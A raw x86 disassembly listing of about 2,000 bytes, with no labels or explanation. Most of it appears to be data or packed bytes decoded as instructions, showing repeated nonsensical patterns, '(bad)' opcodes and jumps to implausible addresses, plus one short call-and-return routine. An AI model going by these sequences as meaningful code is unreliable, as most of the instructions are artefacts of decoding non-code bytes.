  40911e:	push   0xffffffea
  409120:	xchg   DWORD PTR [eax],edx
  409122:	retf   0x4171
  409125:	adc    al,0xe0
  409127:	inc    eax
  409128:	inc    ecx
  409129:	inc    ebx
  40912a:	inc    eax
  40912b:	add    eax,0x43406262
  409130:	inc    ecx
  409131:	adc    BYTE PTR [eax],al
  409133:	inc    eax
  409134:	add    eax,0x43000562
  409139:	add    BYTE PTR [ecx+0x40],al
  40913c:	inc    eax
  40913d:	add    eax,0x400062
  409142:	inc    ebx
  409143:	inc    eax
  409144:	js     0x409187
  409146:	inc    ecx
  409147:	bound  eax,QWORD PTR [eax+0x51]
  40914a:	mov    ah,0x49
  40914c:	push   ss
  40914d:	and    al,0x4d
  40914f:	inc    eax
  409150:	and    eax,0x4d2f94b0
  409155:	(bad)  
  409156:	rcr    BYTE PTR [eax],0x7e
  409159:	jno    0x409150
  40915b:	loope  0x40918a
  40915d:	fwait
  40915e:	cmp    al,0x40
  409160:	popa   
  409161:	bound  eax,QWORD PTR [eax+0x5]
  409164:	inc    ecx
  409165:	add    BYTE PTR [ebx+0x40],al
  409168:	inc    eax
  409169:	inc    ecx
  40916a:	inc    eax
  40916b:	inc    eax
  40916c:	bound  eax,QWORD PTR ds:0x5624300
  409172:	add    BYTE PTR [eax+0x40],al
  409175:	add    BYTE PTR [ecx+0x43],al
  409178:	add    BYTE PTR [eax+0x41],al
  40917b:	add    eax,0x40436200
  409180:	inc    eax
  409181:	add    eax,0x1e115062
  409186:	push   ds
  409187:	pushf  
  409188:	xchg   ebp,eax
  409189:	adc    al,0x41
  40918b:	mov    cl,0x2d
  40918d:	adc    ebp,edx
  40918f:	imul   ebx,DWORD PTR [ecx+0x40],0x629dca60
  409196:	push   ebp
  409197:	cmp    al,0x66
  409199:	outs   dx,BYTE PTR ds:[esi]
  40919a:	xor    esi,DWORD PTR [eax-0x6b090d5c]
  4091a0:	dec    eax
  4091a1:	inc    eax
  4091a2:	addr16 aaa 
  4091a4:	stos   DWORD PTR es:[edi],eax
  4091a5:	sub    BYTE PTR [eax+eiz*4+0x68],bl
  4091a9:	push   cs
  4091aa:	sub    ebx,DWORD PTR gs:[edx+0x22]
  4091ae:	and    BYTE PTR ds:0xd15a4061,dl
  4091b4:	call   0x6243:0x40054041
  4091bb:	inc    ecx
  4091bc:	test   BYTE PTR [eax],al
  4091be:	and    eax,0x404043
  4091c3:	add    BYTE PTR ds:0x626210,al
  4091c9:	add    eax,0x43404140
  4091ce:	inc    eax
  4091cf:	inc    ecx
  4091d0:	add    eax,0x10664062
  4091d5:	inc    ebx
  4091d6:	(bad)  
  4091d7:	leave  
  4091d8:	sbb    al,0xc9
  4091da:	arpl   WORD PTR [edi],cx
  4091dc:	and    dl,BYTE PTR [ebx-0x6c]
  4091df:	add    ebp,ecx
  4091e1:	inc    esp
  4091e2:	popa   
  4091e3:	inc    eax
  4091e4:	sbb    esi,DWORD PTR [ebx+0x1157673d]
  4091ea:	or     al,0x9
  4091ec:	push   0x41cc0547
  4091f1:	inc    eax
  4091f2:	add    BYTE PTR [eax],al
  4091f4:	add    BYTE PTR [eax+0x40],al
  4091f7:	inc    ebx
  4091f8:	bound  eax,QWORD PTR [eax]
  4091fa:	inc    eax
  4091fb:	inc    eax
  4091fc:	add    eax,0x62434162
  409201:	inc    eax
  409202:	js     0x409214
  409204:	inc    ecx
  409205:	add    eax,0x5404325
  40920a:	bound  eax,QWORD PTR [eax+0x40]
  40920d:	inc    ecx
  40920e:	inc    ebx
  40920f:	les    eax,FWORD PTR [edx+edx*4-0x35]
  409213:	rol    DWORD PTR [eax+0x40],1
  409216:	adc    eax,0xbcc52cfe
  40921b:	bound  edx,QWORD PTR [edi+ebx*1]
  40921e:	test   DWORD PTR [ecx],0x430d9c1d
  409224:	inc    eax
  409225:	pusha  
  409226:	or     BYTE PTR [esi+0x4045520d],bl
  40922c:	add    eax,DWORD PTR [edi*2+0x60d8bcc]
  409233:	cli    
  409234:	inc    edx
  409235:	add    BYTE PTR [ebp+0x483974c9],al
  40923b:	mov    edi,0x42f901
  409240:	dec    eax
  409241:	mov    esi,0x429028
  409246:	test   eax,eax
  409248:	je     0x409273
  40924a:	mov    ebx,DWORD PTR [esi]
  40924c:	mov    esi,0x41dc24
  409251:	push   ebx
  409252:	call   0x41db10
  409257:	mov    esi,edi
  409259:	mov    eax,0x64
  40925e:	add    DWORD PTR ds:0x42fa0f,eax
  409264:	mov    ecx,DWORD PTR [esi]
  409266:	pop    eax
  409267:	mov    ds:0x42fa1b,eax
  40926c:	push   ecx
  40926d:	push   eax
  40926e:	call   0x403690
  409273:	ret    
  409274:	int3   
  409275:	int3   
  409276:	int3   
  409277:	int3   
  409278:	int3   
  409279:	int3   
  40927a:	int3   
  40927b:	int3   
  40927c:	int3   
  40927d:	int3   
  40927e:	int3   
  40927f:	int3   
  409280:	inc    eax
  409281:	lods   eax,DWORD PTR ds:[esi]
  409282:	popa   
  409283:	scas   al,BYTE PTR es:[edi]
  409284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409285:	inc    edi
  409286:	jb     0x4092ca
  409288:	inc    eax
  409289:	sub    eax,0xd43b4a5b
  40928e:	jle    0x4092d0
  409290:	push   ecx
  409291:	dec    ebx
  409292:	imul   ecx,DWORD PTR [edx],0xc626c64
  409298:	inc    eax
  409299:	and    dl,al
  40929b:	push   edx
  40929c:	clc    
  40929d:	test   BYTE PTR [eax+0x2d6e406a],0x98
  4092a4:	into   
  4092a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092a6:	fs sbb al,0x40
  4092a9:	dec    ebp
  4092aa:	ins    DWORD PTR es:[edi],dx
  4092ab:	inc    ebx
  4092ac:	mov    dh,0x52
  4092ae:	gs jl  0x4092f1
  4092b1:	stos   DWORD PTR es:[edi],eax
  4092b2:	add    eax,0x4041cc
  4092b7:	add    BYTE PTR [eax],al
  4092b9:	inc    eax
  4092ba:	inc    eax
  4092bb:	inc    ebx
  4092bc:	bound  eax,QWORD PTR [eax]
  4092be:	inc    eax
  4092bf:	inc    eax
  4092c0:	add    eax,0x62434162
  4092c5:	inc    eax
  4092c6:	js     0x4092d8
  4092c8:	inc    ecx
  4092c9:	add    eax,0x5404325
  4092ce:	bound  eax,QWORD PTR [eax+0x40]
  4092d1:	inc    ecx
  4092d2:	inc    ebx
  4092d3:	arpl   WORD PTR ds:0x630dd71a,ax
  4092d9:	inc    eax
  4092da:	inc    ebp
  4092db:	dec    ecx
  4092dc:	gs data16 int 0xf5
  4092e0:	inc    ebx
  4092e1:	inc    eax
  4092e2:	mov    ds:0x40ccd062,eax
  4092e7:	fldenv [edx-0x18d1bdc0]
  4092ed:	push   ecx
  4092ee:	or     al,0x25
  4092f0:	inc    ecx
  4092f1:	bound  eax,QWORD PTR [ebx+0x0]
  4092f4:	adc    BYTE PTR [eax+0x0],al
  4092f7:	add    eax,0x62410040
  4092fc:	inc    eax
  4092fd:	add    BYTE PTR [ebx-0x34],al
  409300:	inc    eax
  409301:	add    eax,0x78434040
  409306:	bound  eax,QWORD PTR [ecx+0x78]
  409309:	add    eax,0x62404043
  40930e:	pop    esp
  40930f:	add    DWORD PTR [eax+0x60],0x67a5aa52
  409316:	or     eax,DWORD PTR [eax+0x40]
  409319:	xor    esp,DWORD PTR [ebp+0x3172ca0b]
  40931f:	inc    ecx
  409320:	inc    eax
  409321:	inc    edx
  409322:	mov    ebp,0xcaa851cf
  409327:	outs   dx,BYTE PTR ds:[esi]
  409328:	inc    eax
  409329:	stos   DWORD PTR es:[edi],eax
  40932a:	dec    eax
  40932b:	pop    ss
  40932c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40932d:	adc    bl,dl
  40932f:	and    BYTE PTR [eax+0x1d],al
  409332:	popa   
  409333:	cs inc ecx
  409335:	inc    eax
  409336:	add    eax,0x43436240
  40933b:	add    eax,0x62004040
  409340:	inc    eax
  409341:	add    BYTE PTR [ecx+0x40],al
  409344:	inc    ebx
  409345:	test   BYTE PTR ds:0x58054041,ah
  40934b:	inc    eax
  40934c:	inc    eax
  40934d:	bound  eax,QWORD PTR [eax+0x66]
  409350:	inc    ecx
  409351:	inc    eax
  409352:	add    eax,0xd8b0c800
  409357:	bound  eax,QWORD PTR [eax+0x44]
  40935a:	inc    ebp
  40935b:	leave  
  40935c:	push   ecx
  40935d:	add    eax,0xe04051c2
  409362:	mov    ds:0xe4cda5e9,eax
  409367:	inc    esp
  409368:	inc    eax
  409369:	daa    
  40936a:	push   esi
  40936b:	dec    ecx
  40936c:	(bad)  
  40936d:	adc    bh,BYTE PTR [eax+0x63424007]
  409373:	adc    DWORD PTR [edx-0x48],ecx
  409376:	arpl   dx,si
  409378:	inc    eax
  409379:	and    eax,ecx
  40937b:	shr    DWORD PTR [ebp+0x43000015],1
  409381:	inc    eax
  409382:	bound  eax,QWORD PTR ds:0x25404110
  409388:	add    ah,cl
  40938a:	inc    ebx
  40938b:	add    eax,0x40402562
  409390:	add    BYTE PTR [eax+0x40],al
  409393:	inc    ecx
  409394:	inc    ecx
  409395:	add    eax,0x78434025
  40939a:	bound  eax,QWORD PTR [eax-0x7c]
  40939d:	inc    eax
  40939e:	inc    ecx
  40939f:	lods   al,BYTE PTR ds:[esi]
  4093a0:	bound  eax,QWORD PTR [eax+0x42]
  4093a3:	and    DWORD PTR [ebp-0x34c9323c],esp
  4093a9:	inc    eax
  4093aa:	loopne 0x409402
  4093ac:	push   es
  4093ad:	push   ecx
  4093ae:	pop    ecx
  4093af:	push   ebp
  4093b0:	cdq    
  4093b1:	inc    eax
  4093b2:	xor    al,0x21
  4093b4:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4093b6:	xor    eax,0xea40a562
  4093bb:	jno    0x409351
  4093bd:	ret    0xd49
  4093c0:	arpl   WORD PTR [ecx+0x40],ax
  4093c3:	inc    eax
  4093c4:	inc    ebx
  4093c5:	int3   
  4093c6:	add    BYTE PTR ds:0x56240,al
  4093cc:	inc    ebx
  4093cd:	inc    eax
  4093ce:	inc    eax
  4093cf:	add    BYTE PTR [ecx+0x62],al
  4093d2:	bound  eax,QWORD PTR [eax]
  4093d4:	int3   
  4093d5:	inc    eax
  4093d6:	inc    ebx
  4093d7:	add    eax,0x43624041
  4093dc:	adc    BYTE PTR [ecx+0x5],al
  4093df:	inc    eax
  4093e0:	inc    eax
  4093e1:	and    ah,BYTE PTR [ecx]
  4093e3:	sub    al,0x51
  4093e5:	js     0x40939b
  4093e7:	inc    edi
  4093e8:	je     0x409414
  4093ea:	frstor gs:[ebp+0x7082590]
  4093f1:	inc    eax
  4093f2:	and    esi,DWORD PTR [esi]
  4093f4:	sar    BYTE PTR [ebx-0xb8b26e6],0xf1
  4093fb:	bound  edx,QWORD PTR [ecx+0x6]
  4093fe:	jl     0x409464
  409400:	jl     0x409431
  409402:	loope  0x4093cd
  409404:	bound  eax,QWORD PTR [ebx+0x40]
  409407:	adc    BYTE PTR ds:0x4158cc40,al
  40940d:	inc    ebx
  40940e:	bound  eax,QWORD PTR [ecx+0x40]
  409411:	add    eax,0x4140
  409416:	and    eax,0x40400062
  40941b:	add    eax,0x84404340
  409420:	int3   
  409421:	js     0x409423
  409423:	inc    ecx
  409424:	adc    BYTE PTR [edx+0xf],ah
  409427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409428:	test   al,0x63
  40942a:	mov    esi,0x51bfe674
  40942f:	xchg   BYTE PTR [ecx],dl
  409431:	ins    DWORD PTR es:[edi],dx
  409432:	and    al,0x6a
  409434:	and    ah,BYTE PTR [edx-0x4f]
  409437:	cmp    al,0xa4
  409439:	test   al,0xd7
  40943b:	add    BYTE PTR [eax+0x41],al
  40943e:	inc    eax
  40943f:	inc    ebx
  409440:	bound  ax,DWORD PTR ds:0x40434100
  409447:	add    eax,0x40054062
  40944c:	bound  eax,QWORD PTR [ecx+0x40]
  40944f:	inc    ebx
  409450:	inc    eax
  409451:	add    eax,0x25405841
  409456:	bound  eax,QWORD PTR [eax+0x43]
  409459:	inc    eax
  40945a:	adc    BYTE PTR [edx+esi*1-0x1b],dh
  40945e:	dec    esp
  40945f:	bound  eax,QWORD PTR [edx+0x10]
  409462:	outs   dx,BYTE PTR ds:[esi]
  409463:	pop    edi
  409464:	xlat   BYTE PTR ds:[ebx]
  409465:	cld    
  409466:	mov    esi,0x41ace8c5
  40946b:	je     0x4094cf
  40946d:	mov    ds:0x41c460ab,eax
  409472:	arpl   WORD PTR [ecx+0x6e],bx
  409475:	int    0xbe
  409477:	in     eax,0x55
  409479:	pusha  
  40947a:	dec    esi
  40947b:	jae    0x4094bd
  40947d:	arpl   WORD PTR [ecx-0x2],si
  409480:	mov    eax,0x61bf3078
  409485:	inc    eax
  409486:	inc    ecx
  409487:	inc    ebx
  409488:	inc    eax
  409489:	add    eax,0x43406262
  40948e:	inc    ecx
  40948f:	adc    BYTE PTR [eax],al
  409491:	inc    eax
  409492:	add    eax,0x43000562
  409497:	add    BYTE PTR [ecx+0x40],al
  40949a:	inc    eax
  40949b:	add    eax,0x400062
  4094a0:	inc    ebx
  4094a1:	inc    eax
  4094a2:	js     0x4094e5
  4094a4:	inc    ecx
  4094a5:	bound  eax,QWORD PTR [eax+0x65]
  4094a8:	frstor [eax]
  4094aa:	mov    dh,0x62
  4094ac:	shl    DWORD PTR [ebx+0x45],0x65
  4094b0:	cmp    al,0x62
  4094b2:	push   esi
  4094b3:	adc    eax,0x4120c255
  4094b8:	sub    BYTE PTR [ecx+edx*8],bh
  4094bb:	imul   esi,DWORD PTR [ecx],0x73
  4094be:	outs   dx,DWORD PTR ds:[esi]
  4094bf:	and    dl,dl
  4094c1:	aad    0xb4
  4094c3:	mov    DWORD PTR [edx],0x5f2d1637
  4094c9:	push   eax
  4094ca:	or     eax,0x7e736366
  4094cf:	leave  
  4094d0:	retf   0x44ee
  4094d3:	bound  esp,QWORD PTR [eax+0x4d]
  4094d6:	bound  eax,QWORD PTR [eax+0x5]
  4094d9:	inc    ecx
  4094da:	add    BYTE PTR [ebx+0x40],al
  4094dd:	inc    eax
  4094de:	inc    ecx
  4094df:	inc    eax
  4094e0:	inc    eax
  4094e1:	bound  eax,QWORD PTR ds:0x5624300
  4094e7:	add    BYTE PTR [eax+0x40],al
  4094ea:	add    BYTE PTR [ecx+0x43],al
  4094ed:	add    BYTE PTR [eax+0x41],al
  4094f0:	add    eax,0x40436200
  4094f5:	inc    eax
  4094f6:	add    eax,0xd0a12062
  4094fb:	cli    
  4094fc:	loop   0x4094ae
  4094fe:	enter  0x7a72,0x34
  409502:	jmp    0x409500
  409504:	stc    
  409505:	or     eax,0xe151ee63
  40950a:	jmp    0x3a0c47f8
  40950f:	jb     0x4094b1
  409511:	mov    ebx,0x1005ceaf
  409516:	fcom   QWORD PTR ds:0xfa4c5d34
  40951c:	inc    esp
  40951d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40951e:	cmc    
  40951f:	jb     0x409569
  409521:	mov    ds:0x5e35061,eax
  409526:	test   eax,0xd4412060
  40952b:	lods   eax,DWORD PTR ds:[esi]
  40952c:	clc    
  40952d:	inc    ebx
  40952e:	mov    eax,0x5404172
  409533:	inc    eax
  409534:	inc    ebx
  409535:	bound  eax,QWORD PTR [ecx-0x7c]
  409538:	add    BYTE PTR ds:0x404043,ah
  40953e:	add    BYTE PTR ds:0x626210,al
  409544:	add    eax,0x43404140
  409549:	inc    eax
  40954a:	inc    ecx
  40954b:	add    eax,0x10664062
  409550:	inc    ebx
  409551:	bound  ebp,QWORD PTR [eax]
  409553:	arpl   ax,bx
  409555:	clc    
  409556:	mov    al,0x44
  409558:	cmp    DWORD PTR [eax+0xd],edx
  40955b:	je     0x4095a8
  40955d:	push   ebx
  40955e:	adc    eax,0xad71bf19
  409563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409564:	push   ecx
  409565:	stc    
  409566:	inc    ebp
  409567:	add    BYTE PTR [edx+esi*4+0x4d],ch
  40956b:	inc    ebx
  40956c:	inc    edx
  40956d:	push   cs
  40956e:	out    0x62,eax
  409570:	and    BYTE PTR [ecx+0x61],dh
  409573:	call   0x353b905d
  409578:	pusha  
  409579:	pushf  
  40957a:	jmp    0x4095ae
  40957c:	jp     0x409583
  40957e:	int3   
  40957f:	inc    ecx
  409580:	inc    eax
  409581:	add    BYTE PTR [eax],al
  409583:	add    BYTE PTR [eax+0x40],al
  409586:	inc    ebx
  409587:	bound  eax,QWORD PTR [eax]
  409589:	inc    eax
  40958a:	inc    eax
  40958b:	add    eax,0x62434162
  409590:	inc    eax
  409591:	js     0x4095a3
  409593:	inc    ecx
  409594:	add    eax,0x5404325
  409599:	bound  eax,QWORD PTR [eax+0x40]
  40959c:	inc    ecx
  40959d:	inc    ebx
  40959e:	imul   BYTE PTR [eax+eax*2+0x26684024]
  4095a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095a6:	inc    esi
  4095a7:	jae    0x40954d
  4095a9:	bound  eax,QWORD PTR [eax+0x21]
  4095ac:	loope  0x4095de
  4095ae:	mov    bh,0xd2
  4095b0:	cmp    eax,0x484f40c5
  4095b5:	xchg   ah,dh
  4095b7:	stos   BYTE PTR es:[edi],al
  4095b8:	ret    
  4095b9:	fsubr  QWORD PTR [eax-0x5f]
  4095bc:	popa   
  4095bd:	mov    DWORD PTR ds:0x40326405,eax
  4095c3:	in     eax,dx
  4095c4:	das    
  4095c5:	les    esp,FWORD PTR [ecx+0x418c3441]
  4095cb:	and    BYTE PTR [ebx],ah
  4095cd:	sub    eax,0x7044c2d2
  4095d2:	add    BYTE PTR [edi],ch
  4095d4:	mov    bh,0xc0
  4095d6:	and    eax,0x436241
  4095db:	adc    BYTE PTR [eax+0x0],al
  4095de:	add    eax,0x62410040
  4095e3:	inc    eax
  4095e4:	add    BYTE PTR [ebx-0x34],al
  4095e7:	inc    eax
  4095e8:	add    eax,0x78434040
  4095ed:	bound  eax,QWORD PTR [ecx+0x78]
  4095f0:	add    eax,0x62404043
  4095f5:	adc    BYTE PTR fs:[ebp-0x79],al
  4095f9:	inc    eax
  4095fa:	jne    0x409645
  4095fc:	jns    0x4095f6
  4095fe:	clc    
  4095ff:	dec    esp
  409600:	fs inc eax
  409602:	loop   0x409625
  409604:	jae    0x4095f8
  409606:	test   al,0x52
  409608:	add    al,BYTE PTR [eax+0x6d]
  40960b:	inc    edi
  40960c:	add    eax,0xc9a01515
  409611:	jnp    0x409679
  409613:	popa   
  409614:	mov    edi,0x411541a0
  409619:	mov    eax,0xeff15622
  40961e:	inc    ecx
  40961f:	leave  
  409620:	dec    ecx
  409621:	jnp    0x409637
  409623:	mov    ds:0x5404142,eax
  409628:	inc    eax
  409629:	bound  eax,QWORD PTR [ebx+0x43]
  40962c:	add    eax,0x62004040
  409631:	inc    eax
  409632:	add    BYTE PTR [ecx+0x40],al
  409635:	inc    ebx
  409636:	test   BYTE PTR ds:0x58054041,ah
  40963c:	inc    eax
  40963d:	inc    eax
  40963e:	bound  eax,QWORD PTR [eax+0x66]
  409641:	inc    ecx
  409642:	inc    eax
  409643:	add    eax,0x3cc06400
  409648:	les    esp,FWORD PTR [edx-0x585c656]
  40964e:	or     eax,0x407b4241
  409653:	loope  0x4096a8
  409655:	lock cli 
  409657:	adc    al,0xe0
  409659:	jge    0x40963b
  40965b:	and    al,0x11
  40965d:	or     eax,0x40430000
  409662:	bound  eax,QWORD PTR ds:0x25404110
  409668:	add    ah,cl
  40966a:	inc    ebx
  40966b:	add    eax,0x40402562
  409670:	add    BYTE PTR [eax+0x40],al
  409673:	inc    ecx
  409674:	inc    ecx
  409675:	add    eax,0x78434025
  40967a:	bound  eax,QWORD PTR [eax-0x7c]
  40967d:	inc    eax
  40967e:	inc    ecx
  40967f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409680:	inc    ebx
  409681:	jo     0x4096fd
  409683:	sub    al,0xa7
  409685:	arpl   WORD PTR [edi+0xd],cx
  409688:	xor    bh,ch
  40968a:	and    al,0x4d
  40968c:	or     eax,0x7841ebd9
  409691:	test   al,0x7a
  409693:	in     eax,0xa2
  409695:	push   esi
  409696:	stc    
  409697:	inc    ecx
  409698:	bound  esp,QWORD PTR [eax+0x17]
  40969b:	shr    BYTE PTR [edx],0x5e
  40969e:	out    dx,al
  40969f:	rol    BYTE PTR [ebp+0x1],0x7a
  4096a3:	in     eax,0x81
  4096a5:	jne    0x4096ac
  4096a7:	add    eax,0x6b47c982
  4096ac:	loope  0x40970a
  4096ae:	dec    edi
  4096af:	stc    
  4096b0:	sub    eax,DWORD PTR [ebx+0x79]
  4096b3:	inc    ecx
  4096b4:	inc    eax
  4096b5:	inc    eax
  4096b6:	inc    ebx
  4096b7:	int3   
  4096b8:	add    BYTE PTR ds:0x56240,al
  4096be:	inc    ebx
  4096bf:	inc    eax
  4096c0:	inc    eax
  4096c1:	add    BYTE PTR [ecx+0x62],al
  4096c4:	bound  eax,QWORD PTR [eax]
  4096c6:	int3   
  4096c7:	inc    eax
  4096c8:	inc    ebx
  4096c9:	add    eax,0x43624041
  4096ce:	adc    BYTE PTR [ecx+0x5],al
  4096d1:	inc    eax
  4096d2:	and    DWORD PTR [ebp+0x72a4eb72],edi
  4096d8:	dec    edx
  4096d9:	mov    bh,0x56
  4096db:	push   esp
  4096dc:	fdivp  st(0),st
  4096de:	add    eax,0xa379ccf7
  4096e3:	loope  0x40968a
  4096e5:	in     al,dx
  4096e6:	inc    ecx
  4096e7:	push   ebx
  4096e8:	adc    bl,bh
  4096ea:	dec    esp
  4096eb:	or     al,0x94
  4096ed:	adc    eax,0x79dca44f
  4096f2:	jecxz  0x4096d5
  4096f4:	mov    al,ds:0x10404362
  4096f9:	add    eax,0x4158cc40
  4096fe:	inc    ebx
  4096ff:	bound  eax,QWORD PTR [ecx+0x40]
  409702:	add    eax,0x4140
  409707:	and    eax,0x40400062
  40970c:	add    eax,0x84404340
  409711:	int3   
  409712:	js     0x409714
  409714:	inc    ecx
  409715:	adc    BYTE PTR [edx+0xf],ah
  409718:	dec    edi
  409719:	sar    BYTE PTR [ebx+0x2840d462],0xbe
  409720:	jmp    0x409736
  409722:	lods   eax,DWORD PTR ds:[esi]
  409723:	inc    eax
  409724:	jns    0x4096c9
  409726:	and    dl,bh
  409728:	cli    
  409729:	clc    
  40972a:	push   ebx
  40972b:	inc    eax
  40972c:	mov    DWORD PTR [eax],0x43404140
  409732:	bound  ax,DWORD PTR ds:0x40434100
  409739:	add    eax,0x40054062
  40973e:	bound  eax,QWORD PTR [ecx+0x40]
  409741:	inc    ebx
  409742:	inc    eax
  409743:	add    eax,0x25405841
  409748:	bound  eax,QWORD PTR [eax+0x43]
  40974b:	inc    eax
  40974c:	adc    bh,bh
  40974e:	xor    ah,al
  409750:	jmp    0x2453:0x79d8cb40
  409757:	jno    0x409766
  409759:	inc    eax
  40975a:	mov    al,0x30
  40975c:	cmp    al,0xe1
  40975e:	and    DWORD PTR [ebx-0x57dbbfb1],esp
  409764:	jns    0x40972b
  409766:	xor    al,0xbf
  409768:	jmp    0x40973b
  40976a:	cs pop esp
  40976c:	xor    edx,esp
  40976e:	popa   
  40976f:	and    bh,cl
  409771:	test   eax,0x13790267
  409776:	inc    eax
  409777:	inc    ecx
  409778:	inc    ebx
  409779:	inc    eax
  40977a:	add    eax,0x43406262
  40977f:	inc    ecx
  409780:	adc    BYTE PTR [eax],al
  409782:	inc    eax
  409783:	add    eax,0x43000562
  409788:	add    BYTE PTR [ecx+0x40],al
  40978b:	inc    eax
  40978c:	add    eax,0x400062
  409791:	inc    ebx
  409792:	inc    eax
  409793:	js     0x4097d6
  409795:	inc    ecx
  409796:	bound  eax,QWORD PTR [eax+0x28]
  409799:	gs call 0x2509e25b
  40979f:	xor    DWORD PTR [ecx],esp
  4097a1:	dec    edx
  4097a2:	add    eax,0x7945c805
  4097a7:	loope  0x4097ed
  4097a9:	test   al,0x4f
  4097ab:	retf   
  4097ac:	push   edx
  4097ad:	inc    esp
  4097ae:	sbb    dh,BYTE PTR [edx]
  4097b0:	and    BYTE PTR [eax],al
  4097b2:	jmp    0x4097fc
  4097b4:	mov    bh,0xfc
  4097b6:	jns    0x4097ef
  4097b8:	scas   eax,DWORD PTR es:[edi]
  4097b9:	mov    bl,0xf8
  4097bb:	dec    eax
  4097bc:	lds    eax,FWORD PTR [eax+0xf]
  4097bf:	pop    ebx
  4097c0:	ins    BYTE PTR es:[edi],dx
  4097c1:	xchg   esi,eax
  4097c2:	out    0x47,al
  4097c4:	dec    edi
  4097c5:	inc    eax
  4097c6:	jns    0x409828
  4097c8:	bound  eax,QWORD PTR [eax+0x5]
  4097cb:	inc    ecx
  4097cc:	add    BYTE PTR [ebx+0x40],al
  4097cf:	inc    eax
  4097d0:	inc    ecx
  4097d1:	inc    eax
  4097d2:	inc    eax
  4097d3:	bound  eax,QWORD PTR ds:0x5624300
  4097d9:	add    BYTE PTR [eax+0x40],al
  4097dc:	add    BYTE PTR [ecx+0x43],al
  4097df:	add    BYTE PTR [eax+0x41],al
  4097e2:	add    eax,0x40436200
  4097e7:	inc    eax
  4097e8:	add    eax,0x469c4062
  4097ed:	jl     0x409857
  4097ef:	xlat   BYTE PTR ds:[ebx]
  4097f0:	add    ch,BYTE PTR [ecx]
  4097f2:	and    eax,0x376baa94
  4097f7:	ds jns 0x40985f
  4097fa:	dec    esp
  4097fb:	and    esp,esp
  4097fd:	push   edx
  4097fe:	dec    esp
  4097ff:	test   al,0x77
  409801:	arpl   bx,sp
  409803:	ror    BYTE PTR [ecx+0x7c],1
  409806:	add    BYTE PTR [edi+0x79],dh
  409809:	popf   
  40980a:	jns    0x40985b
  40980c:	mov    ch,0x6f
  40980e:	inc    esp
  40980f:	inc    ecx
  409810:	inc    eax
  409811:	add    eax,0x41624340
  409816:	test   BYTE PTR [eax],al
  409818:	and    eax,0x404043
  40981d:	add    BYTE PTR ds:0x626210,al
  409823:	add    eax,0x43404140
  409828:	inc    eax
  409829:	inc    ecx
  40982a:	add    eax,0x10664062
  40982f:	inc    ebx
  409830:	bound  eax,QWORD PTR [ebx+0x6c]
  409833:	shl    DWORD PTR [ecx],1
  409835:	fucom  st(2)
  409837:	jp     0x40986f
  409839:	pop    esi
  40983a:	jns    0x40981f
  40983c:	add    eax,0x45e80534
  409841:	sub    al,0x5f
  409843:	pop    edi
  409844:	loop   0x4097f0
  409846:	mov    eax,ds:0x7944a8b4
  40984b:	and    ah,BYTE PTR [ecx]
  40984d:	stos   DWORD PTR es:[edi],eax
  40984e:	jle    0x409886
  409850:	ja     0x40988e
  409852:	add    eax,0x4041cc
  409857:	add    BYTE PTR [eax],al
  409859:	inc    eax
  40985a:	inc    eax
  40985b:	inc    ebx
  40985c:	bound  eax,QWORD PTR [eax]
  40985e:	inc    eax
  40985f:	inc    eax
  409860:	add    eax,0x62434162
  409865:	inc    eax
  409866:	js     0x409878
  409868:	inc    ecx
  409869:	add    eax,0x5404325
  40986e:	bound  eax,QWORD PTR [eax+0x40]
  409871:	inc    ecx
  409872:	inc    ebx
  409873:	push   esp
  409874:	and    eax,0x91659024
  409879:	stos   BYTE PTR es:[edi],al
  40987a:	and    edi,DWORD PTR [ecx-0x3e]
  40987d:	mov    ds:0x6448e0af,al
  409882:	or     cl,BYTE PTR [ecx+0x67]
  409885:	pop    ebp
  409886:	lock adc eax,0x78077f15
  40988c:	(bad)  
  40988d:	mov    cl,BYTE PTR ss:[edi-0x35]
  409891:	js     0x4098c1
  409893:	mov    ecx,0xea5f1365
  409898:	aaa    
  409899:	bound  esp,QWORD PTR [ebx+0x78]
  40989c:	aas    
  40989d:	mov    eax,ds:0x10c38bb8
  4098a2:	adc    BYTE PTR [edi+0x624125e5],ch
  4098a8:	inc    ebx
  4098a9:	add    BYTE PTR [eax],dl
  4098ab:	inc    eax
  4098ac:	add    BYTE PTR ds:0x62410040,al
  4098b2:	inc    eax
  4098b3:	add    BYTE PTR [ebx-0x34],al
  4098b6:	inc    eax
  4098b7:	add    eax,0x78434040
  4098bc:	bound  eax,QWORD PTR [ecx+0x78]
  4098bf:	add    eax,0x62404043
  4098c4:	inc    ebx
  4098c5:	mov    ah,ah
  4098c7:	fs mov ah,0x4c
  4098ca:	js     0x409910
  4098cc:	loopne 0x40993c
  4098ce:	enterw 0x4705,0xa0
  4098d3:	popa   
  4098d4:	sub    DWORD PTR [edx],edx
  4098d6:	dec    ebp
  4098d7:	retf   
  4098d8:	int    0x86
  4098da:	js     0x409928
  4098dc:	cmp    eax,0x41bfacfb
  4098e1:	adc    al,BYTE PTR [ecx+0x40]
  4098e4:	add    eax,0x43436240
  4098e9:	add    eax,0x62004040
  4098ee:	inc    eax
  4098ef:	add    BYTE PTR [ecx+0x40],al
  4098f2:	inc    ebx
  4098f3:	test   BYTE PTR ds:0x58054041,ah
  4098f9:	inc    eax
  4098fa:	inc    eax
  4098fb:	bound  eax,QWORD PTR [eax+0x66]
  4098fe:	inc    ecx
  4098ff:	inc    eax
  409900:	add    eax,0x25228c00
  409905:	lods   eax,DWORD PTR ds:[esi]
  409906:	xchg   esi,eax
  409907:	mov    edi,0x9f4050e3
  40990c:	jl     0x4098f7
  40990e:	adc    eax,0x4082ec07
  409913:	xor    al,0x61
  409915:	dec    ebx
  409916:	dec    eax
  409917:	test   DWORD PTR [ebp-0x3d],esp
  40991a:	inc    eax
  40991b:	rcr    DWORD PTR [ebp-0x6c],cl
  40991e:	(bad)  
  40991f:	test   al,0x9c
  409921:	inc    ecx
  409922:	jl     0x4098c6
  409924:	mov    al,ds:0x2045fa20
  409929:	inc    ebx
  40992a:	inc    eax
  40992b:	das    
  40992c:	sub    eax,0x9fd1945b
